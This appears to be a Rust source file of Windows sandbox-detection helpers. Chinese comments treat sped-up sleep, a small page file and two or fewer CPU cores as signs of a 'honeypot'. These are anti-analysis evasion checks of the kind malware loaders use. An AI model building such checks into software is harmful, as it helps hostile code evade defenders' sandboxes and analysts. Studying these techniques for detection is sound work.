use std::thread::sleep;
use std::time::{Duration, Instant};
use winapi::um::sysinfoapi::{GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO};


// 时间流速检测
pub fn flow_time() -> bool {
    let start_time = Instant::now();

    sleep(Duration::from_millis(100));

    let elapsed_time = start_time.elapsed();

    if elapsed_time.as_millis() < 100 {
        return true;
    }
    false
}



// 检测 系统分页文件总页数 ， 一般小于4_000_000 可能为蜜罐
pub fn get_num_pages() -> i32 {
    let mut statex: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
    statex.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;

    if unsafe { GlobalMemoryStatusEx(&mut statex) } == 0 {
        // eprintln!("Failed to get system memory status.");
        return 1;
    }

    let mut system_info: SYSTEM_INFO = unsafe { std::mem::zeroed() };
    unsafe { GetSystemInfo(&mut system_info) };

    return (statex.ullTotalPageFile / system_info.dwPageSize as u64) as i32;
}

// 检测cpu 核心数量，一般小于或等于 2 核 的为 蜜罐
pub unsafe fn check_processor_count() -> bool {
    let mut system_info: SYSTEM_INFO = std::mem::zeroed();
    GetSystemInfo(&mut system_info);
    system_info.dwNumberOfProcessors > 2
}
